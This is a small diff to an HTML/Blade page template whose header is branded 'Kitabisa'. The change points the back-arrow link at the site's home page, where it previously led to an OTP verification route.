@@ -231,7 +231,7 @@
 <body style="margin: 0px; background: #fb036b;">
     <header class="style__Container-sc-3fiysr-0 header">
         <div class="style__Wrapper-sc-3fiysr-2 hBSxmh" style="display: flex; justify-content: space-between;">
-            <a href="<?=url('/')?>/verifikasi-otp/{{Request::segment(2)}}" style="padding-left: 1em;">
+            <a href="<?=url('/')?>" style="padding-left: 1em;">
                 <img src="<?=url('/')?>/public/img/back_white.svg">
             </a>
             <a id="defaultheader_logo" title="Kitabisa" style="margin-left: 20px; height:33px;margin-right:20px" href="/">
